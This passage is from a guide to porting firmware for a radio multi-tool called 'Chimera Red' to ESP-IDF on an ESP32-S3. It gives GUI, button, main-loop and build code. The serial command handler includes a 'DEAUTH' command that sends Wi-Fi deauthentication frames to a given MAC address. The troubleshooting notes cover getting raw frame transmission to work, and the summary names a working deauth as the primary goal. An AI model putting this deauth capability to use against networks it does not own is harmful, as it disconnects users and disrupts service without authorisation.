                uint16_t fg = (i == g_selected_item) ? COLOR_BLACK : COLOR_GREEN;
                display_fill_rect(0, 40 + i * 30, TFT_WIDTH, 28, bg);
                display_draw_text(10, 46 + i * 30, menu_items[i], fg, bg);
            }
            break;
            
        // ... other screens
    }
}

void gui_handle_input(input_t input) {
    switch (input) {
        case INPUT_UP:
            if (g_selected_item > 0) g_selected_item--;
            break;
        case INPUT_DOWN:
            if (g_selected_item < MENU_COUNT - 1) g_selected_item++;
            break;
        case INPUT_SELECT:
            gui_set_screen((screen_t)(g_selected_item + 1));
            break;
        case INPUT_BACK:
            gui_set_screen(SCREEN_HOME);
            break;
        default:
            return;
    }
    gui_update();
}

void gui_update(void) {
    gui_set_screen(g_current_screen);
}

void gui_log(const char *msg) {
    // Shift logs up
    for (int i = 0; i < 4; i++) {
        strcpy(g_status_log[i], g_status_log[i + 1]);
    }
    strncpy(g_status_log[4], msg, 31);
    
    // Draw log area at bottom
    display_fill_rect(0, TFT_HEIGHT - 80, TFT_WIDTH, 80, COLOR_BLACK);
    for (int i = 0; i < 5; i++) {
        display_draw_text(5, TFT_HEIGHT - 75 + i * 15, g_status_log[i], COLOR_GREEN, COLOR_BLACK);
    }
}
```

---

## Step 10: Port Button Input

### 10.1 Create buttons.c

**File: `firmware_idf/main/buttons.c`**
```c
#include "buttons.h"
#include "gui.h"
#include "driver/gpio.h"
#include "esp_timer.h"
#include "esp_log.h"

#define BTN_UP     14
#define BTN_DOWN   47
#define BTN_SELECT 0   // Boot button
#define DEBOUNCE_MS 50

static const char *TAG = "buttons";
static int64_t last_press[3] = {0};

static void IRAM_ATTR gpio_isr_handler(void *arg) {
    int btn = (int)arg;
    int64_t now = esp_timer_get_time() / 1000;
    
    if (now - last_press[btn] > DEBOUNCE_MS) {
        last_press[btn] = now;
        
        input_t input = INPUT_NONE;
        switch (btn) {
            case 0: input = INPUT_UP; break;
            case 1: input = INPUT_DOWN; break;
            case 2: input = INPUT_SELECT; break;
        }
        
        gui_handle_input(input);
    }
}

esp_err_t buttons_init(void) {
    gpio_config_t io_conf = {
        .pin_bit_mask = (1ULL << BTN_UP) | (1ULL << BTN_DOWN) | (1ULL << BTN_SELECT),
        .mode = GPIO_MODE_INPUT,
        .pull_up_en = GPIO_PULLUP_ENABLE,
        .intr_type = GPIO_INTR_NEGEDGE,
    };
    gpio_config(&io_conf);
    
    gpio_install_isr_service(0);
    gpio_isr_handler_add(BTN_UP, gpio_isr_handler, (void*)0);
    gpio_isr_handler_add(BTN_DOWN, gpio_isr_handler, (void*)1);
    gpio_isr_handler_add(BTN_SELECT, gpio_isr_handler, (void*)2);
    
    ESP_LOGI(TAG, "Buttons initialized");
    return ESP_OK;
}
```

---

## Step 11: Create Main Entry Point

### 11.1 Create main.c

**File: `firmware_idf/main/main.c`**
```c
#include "wifi_manager.h"
#include "serial_comm.h"
#include "display.h"
#include "gui.h"
#include "ble_scanner.h"
#include "nfc_pn532.h"
#include "subghz_cc1101.h"
#include "buttons.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "main";

// Serial command handler
static void handle_command(const char *cmd) {
    ESP_LOGI(TAG, "CMD: %s", cmd);
    
    if (strncmp(cmd, "SCAN_WIFI", 9) == 0) {
        wifi_scan_start();
    } 
    else if (strncmp(cmd, "SNIFF_START:", 12) == 0) {
        int ch = atoi(cmd + 12);
        wifi_sniffer_start(ch);
    }
    else if (strncmp(cmd, "DEAUTH:", 7) == 0) {
        // Parse "DEAUTH:XX:XX:XX:XX:XX:XX"
        uint8_t mac[6];
        sscanf(cmd + 7, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
        wifi_send_deauth(NULL, mac, 1);  // Broadcast to AP
    }
    else if (strcmp(cmd, "SCAN_BLE") == 0) {
        ble_scan_start(NULL);
    }
}

void app_main(void) {
    ESP_LOGI(TAG, "=== Chimera Red ESP-IDF ===");
    
    // Initialize all subsystems
    serial_init();
    serial_set_cmd_handler(handle_command);
    
    wifi_manager_init();
    ble_scanner_init();
    pn532_init();
    cc1101_init();
    
    gui_init();
    buttons_init();
    
    gui_log("System Ready");
    serial_send_json("status", "\"CHIMERA_READY\"");
    
    // Main loop - GUI updates
    while (1) {
        vTaskDelay(pdMS_TO_TICKS(50));
        // gui_update() is called by button ISR when needed
    }
}
```

---

## Building & Flashing

### Using ESP-IDF Directly

```bash
cd firmware_idf

# Set up ESP-IDF environment (Windows)
# Run from ESP-IDF Command Prompt or:
# C:\Espressif\frameworks\esp-idf-v5.1\export.bat

# Configure (optional - uses sdkconfig.defaults)
idf.py set-target esp32s3

# Build
idf.py build

# Flash
idf.py -p COM3 flash

# Monitor
idf.py -p COM3 monitor
```

### Using PlatformIO with ESP-IDF

**File: `firmware_idf/platformio.ini`**
```ini
[env:esp32s3-idf]
platform = espressif32
board = esp32-s3-devkitc-1
framework = espidf
monitor_speed = 115200
upload_port = COM3

board_build.partitions = partitions.csv

build_flags = 
    -DCONFIG_BT_ENABLED=y
    -DCONFIG_BT_NIMBLE_ENABLED=y
```

Then:
```bash
pio run --target upload -e esp32s3-idf
```

---

## Troubleshooting

### Error: "esp_wifi_80211_tx returns ESP_ERR_INVALID_ARG"
- Ensure WiFi is in AP mode with `esp_wifi_set_mode(WIFI_MODE_AP)`
- Ensure AP is configured and started before TX
- Disable promiscuous mode before TX, re-enable after

### Error: "BLE and WiFi conflict"
- WiFi and BLE share the same radio
- Use WiFi coexistence: `esp_wifi_set_ps(WIFI_PS_MIN_MODEM)`
- Alternate between WiFi and BLE operations

### Error: "Display shows nothing"
- Check SPI pin assignments match your wiring
- Verify display controller (ST7789 vs ILI9341)
- Add delay after reset pulse

### Error: "I2C timeout"
- Check SDA/SCL connections
- Add external pull-up resistors (4.7kΩ)
- Verify device I2C address

---

## Summary

| Module | Arduino | ESP-IDF | Status |
|--------|---------|---------|--------|
| WiFi/Deauth | ❌ Broken | ✅ Working | Primary goal |
| Serial | ✅ | ✅ | Direct port |
| Display | TFT_eSPI | Custom SPI | Moderate effort |
| BLE | NimBLE-Arduino | NimBLE | Minor changes |
| NFC | Adafruit lib | Custom I2C | Moderate effort |
| Sub-GHz | SmartRC lib | Custom SPI | Moderate effort |
| GUI | Custom | Custom | Minor changes |
| Buttons | OneButton | GPIO ISR | Simple port |

**Total estimated effort: 4-8 hours for a working prototype**

Good luck! 🚀
